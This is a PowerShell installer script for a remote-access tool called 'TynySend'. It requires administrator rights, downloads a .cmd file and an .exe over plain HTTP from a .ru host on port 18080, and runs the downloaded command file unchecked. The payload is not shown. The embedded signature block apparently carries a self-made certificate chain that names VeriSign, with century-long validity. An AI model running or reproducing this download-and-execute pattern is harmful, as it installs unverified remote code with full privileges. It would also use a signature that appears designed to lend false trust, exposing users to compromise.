<#
.SYNOPSIS
    Make TynySend Remote Monitoring Install
.DESCRIPTION
    Make enable Remote Access and Utilities
    on Windows 10.0 Local Computer
.NOTES
    Make TynySend Remote Monitoring Install
    VERSION: 1.0.0a
    AUTHOR: New Internet Technologies Inc.
    Created:  2024-10-30
    Licensed under the BSD license.
    Please credit me if you find this script useful and do some cool things with it.
.VERSION HISTORY:
    1.0.0 - (2024-10-28) Script created
    1.0.1 - 
#>

### Set Variables
#

# Set Powershell File
$aFile01 = 'INSTTSE.cmd'
$aFile02 = 'TINYSEND.exe'
$aPureURL = 'http://lin.netip4.ru:18080/~vagrant/PROGS/LIB-RUN/BAT/'

### Set Functions
#

Function Check-DownloadShellFolder() {
    try {
        $DownloadShellFolder=(New-Object -ComObject Shell.Application).NameSpace('shell:Downloads').Self.Path
    }
    catch {
        Write-Host "Download Shell Folder is not Defined"
        return $false
    }

    if( !$DownloadShellFolder ) {
        Write-Host "Download Shell Folder is not Defined"
        return $false
    }


    if( Test-Path $DownloadShellFolder ) {
        Write-Host "Download Shell Folder is $DownloadShellFolder"
        return $true
    }
    else {
        Write-Host "$DownloadShellFolder is not Found"
        return $false
    }
}

function Get-MyDocumentsShellFolder() {
    $MyDocuments = 5 #System.Environment.SpecialFolder.MyDocuments
    [System.Environment]::GetFolderPath($MyDocuments)
}

function Get-UserProfileShellFolder() {
    if( !$env:USERPROFILE ) {
        return $null
    }
    else {
        $env:USERPROFILE
    }
}


Function Check-MyDocumentsShellFolder() {
    try {
        $DownloadShellFolder=Get-MyDocumentsShellFolder
    }
    catch {
        Write-Host "My Documents Shell Folder is not Defined"
        return $false
    }

    if( !$DownloadShellFolder ) {
        Write-Host "My Documents Shell Folder is not Defined"
        return $false
    }


    if( Test-Path $DownloadShellFolder ) {
        Write-Host "My Documents Shell Folder is $DownloadShellFolder"
        return $true
    }
    else {
        Write-Host "$DownloadShellFolder is not Found"
        return $false
    }
}

Function Check-UserProfileShellFolder() {
    try {
        $DownloadShellFolder=Get-UserProfileShellFolder
    }
    catch {
        Write-Host "User Profile Shell Folder is not Defined"
        return $false
    }

    if( !$DownloadShellFolder ) {
        Write-Host "User Profile Shell Folder is not Defined"
        return $false
    }


    if( Test-Path $DownloadShellFolder ) {
        Write-Host "User Profile  Shell Folder is $DownloadShellFolder"
        return $true
    }
    else {
        Write-Host "$DownloadShellFolder is not Found"
        return $false
    }
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}


## Set System Objects
$wc = New-Object System.Net.WebClient
if( Check-DownloadShellFolder ) {
    $DownloadsDir = (New-Object -ComObject Shell.Application).NameSpace('shell:Downloads').Self.Path
}
else {
    Write-Host "Check Integrity Error! Download Folder is not Found."
    Exit 1
}

## Set Url and Output
$anUrl01 = $aPureURL + $aFile01
$anOutput01 = Join-Path -Path $DownloadsDir -ChildPath $aFile01
$anUrl02 = $aPureURL + $aFile02
$anOutput02 = Join-Path -Path $DownloadsDir -ChildPath $aFile02

Write-Host $anUrl

if( Test-Path -Path $anOutput01 ) {
    ri -Path $anOutput01 -Force
}

if( Test-Path -Path $anOutput02 ) {
    ri -Path $anOutput02 -Force
}


### Running with Elevated Privileges
#

if ((Test-Admin) -eq $false)  {
    Write-Host "Script must be Run with Elevated Privileges"
    exit 17
}

# 'running with full privileges'

$wc.DownloadFile($anUrl01, $anOutput01 )
$wc.DownloadFile($anUrl02, $anOutput02 )
# & $env:COMSPEC /c $anOutput01
# & $env:COMSPEC /c $anOutput01

start $anOutput01  -Wait -NoNewWindow

Write-Host "Script is successfully executed"
exit 0


# SIG # Begin signature block
# MIIJdQYJKoZIhvcNAQcCoIIJZjCCCWICAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUsVhFo+MBn/03+xJKKrXfwZe2
# hgqgggcSMIIDNTCCAqKgAwIBAgIQmRZ8sJ6WnpBM/gOYGjGCZjAJBgUrDgMCHQUA
# MIGfMSMwIQYDVQQDExpOSVQgQ2xhc3MgMyBFViBTU0wgQ0EgLSBHNDEwMC4GA1UE
# CxMnTmV3IEludGVybmV0IFRlY2hub2xvZ2llcyBUcnVzdCBOZXR3b3JrMScwJQYD
# VQQKEx5OZXcgSW50ZXJuZXQgVGVjaG5vbG9naWVzIEluYy4xEDAOBgNVBAcTB1Nh
# cmF0b3YxCzAJBgNVBAYTAlJVMCAXDTIwMDcyMDA2Mjg0N1oYDzIxMjAwNzIwMDYy
# ODQ2WjApMScwJQYDVQQDEx5OZXcgSW50ZXJuZXQgVGVjaG5vbG9naWVzIEluYy4w
# gZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBANDUnk8zGlTyF8GCxB1aULuNpIjq
# DKg5dT2UjOWrxOHgQiYlrqEjC1GPUCwjsS01OgVjv2Z9ukanCPm84m4vhw5AI3oA
# fWQVDV2y88VwicxqyQdBsjhtujZJ2Syw8RgEelGfGaW4KkCffdDaiYTh8Oo2Q/9h
# M4kGar3uvgrxYgBxAgMBAAGjgewwgekwDwYDVR0TAQH/BAUwAwIBBTAgBgNVHQQB
# Af8EFjAUMA4wDAYKKwYBBAGCNwIBFgMCB4AwMAYKKwYBBAGCNwIBCgQiMCCgHoAc
# aHR0cDovL2FudGljcmltaW5hbG9ubGluZS5ydTAdBgNVHSUEFjAUBggrBgEFBQcD
# AwYIKoUDBQEYAg8wYwYDVR0BBFwwWoAQZ+32JfGWOlxSybCD2PIbaaE0MDIxMDAu
# BgNVBAMTJ1ZlcmlTaWduIENsYXNzIDMgQ29kZSBTaWduaW5nIDIwMjAtMiBDQYIQ
# iC3lDQIjxYZJIDHHKQxk/jAJBgUrDgMCHQUAA4GBAKX+PIfzdDJQSsudzSjT/yBb
# MS/GVjrjGY176sQTsHbjf9ggNQIZkEg4pKBynOj20wKBjVobQW4wgGxv5UvgL/Xs
# hPKE58wDL1+9D1teEEtYntdn8z7WzZC2Rm77mZV+yd+ZabUXi9Ym7VezmHfWrned
# H2P0GNuIEpH6mkYUOUBDMIID1TCCAsGgAwIBAgIQiC3lDQIjxYZJIDHHKQxk/jAJ
# BgUrDgMCHQUAMDIxMDAuBgNVBAMTJ1ZlcmlTaWduIENsYXNzIDMgQ29kZSBTaWdu
# aW5nIDIwMjAtMiBDQTAgFw0yMDA3MjAwNjI3MzVaGA8yMTIwMDcyMDA2MjczNFow
# gZ8xIzAhBgNVBAMTGk5JVCBDbGFzcyAzIEVWIFNTTCBDQSAtIEc0MTAwLgYDVQQL
# EydOZXcgSW50ZXJuZXQgVGVjaG5vbG9naWVzIFRydXN0IE5ldHdvcmsxJzAlBgNV
# BAoTHk5ldyBJbnRlcm5ldCBUZWNobm9sb2dpZXMgSW5jLjEQMA4GA1UEBxMHU2Fy
# YXRvdjELMAkGA1UEBhMCUlUwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAKdX
# 5yJUtXxNKgy5yTse+hEHiWu1VgvRpWAiuoeS03A3Id7uwU/1evXXUSDkl293DkJ9
# 8TDUOl2tOSe9K6CyH62Ea0kRaAWloaO6wH60hjH1LIOR0Xu8v/gj/qTXQEShtZt7
# 2I4zMLC67u/yncy5ZtnTkKfljEYssOmiJIqiAx4dAgMBAAGjggEBMIH+MBIGA1Ud
# EwEB/wQIMAYBAf8CAQUwIAYDVR0EAQH/BBYwFDAOMAwGCisGAQQBgjcCARYDAgeA
# MDAGCisGAQQBgjcCAQoEIjAgoB6AHGh0dHA6Ly9hbnRpY3JpbWluYWxvbmxpbmUu
# cnUwOwYDVR0lBDQwMgYIKwYBBQUHAwEGCCsGAQUFBwMCBggrBgEFBQcDAwYIKwYB
# BQUHAwQGCCqFAwUBGAIPMFcGA1UdAQRQME6AEHiV66FUatLJmUqI8CyehfChNDAy
# MTAwLgYDVQQDEydWZXJpU2lnbiBDbGFzcyAzIENvZGUgU2lnbmluZyAyMDIwLTIg
# Q0GCBLIuGUUwCQYFKw4DAh0FAAOCAQEAAc2GsrnY7lhqifgBxWvKAo909Ag0CE+L
# hjqINvw+dd1krEmWgyGAsCGvYUYI5t5aQ/+6wYMQc5hV3az+c7f79z4Zqy+HBlFM
# F0cwB7kSiyJ5LL9vsN4krXku1GLWbtUINgcYGBkzZEDzm2F0hGjxILH6uD7skZ3p
# EIxJinJezmSZz9dkvkGMRGuy17TT1Mm4j+ggRrRWk24+bLJ2Q9zFJTIdoxeJ6iz7
# G6z+7g718x7rplcYMZaGejv1rT8te62ZHHPvIKaekZ69JX2Om8uFcjUAgzBO06RR
# 6ATm3W4X3QUXiy6hfOHZUVvSjQQ0XxYnyYS/IOaJUtAf6lj+ZnY5fzGCAc0wggHJ
# AgEBMIG0MIGfMSMwIQYDVQQDExpOSVQgQ2xhc3MgMyBFViBTU0wgQ0EgLSBHNDEw
# MC4GA1UECxMnTmV3IEludGVybmV0IFRlY2hub2xvZ2llcyBUcnVzdCBOZXR3b3Jr
# MScwJQYDVQQKEx5OZXcgSW50ZXJuZXQgVGVjaG5vbG9naWVzIEluYy4xEDAOBgNV
# BAcTB1NhcmF0b3YxCzAJBgNVBAYTAlJVAhCZFnywnpaekEz+A5gaMYJmMAkGBSsO
# AwIaBQCgcDAQBgorBgEEAYI3AgEMMQIwADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGC
# NwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFjAjBgkqhkiG9w0BCQQx
# FgQUe3vPBR1sp43+qENlWKXAnNxuqaIwDQYJKoZIhvcNAQEBBQAEgYCQokZ/TQbC
# RHWOMM85iUliQI0hnwG5vEfvX576kzYJJJtQ+4B+U3wkq23oRfoLxMYrC/8976Fn
# 5HsaLOkopKf22WJ8xvkS0gODQsYGE4qJf8sQznVk1mhUcSSoSweOZ0tFxvU6F9Wx
# 9tZGI20Aj1Rf0FmbCZtU1rSwq74EQXyOqw==
# SIG # End signature block
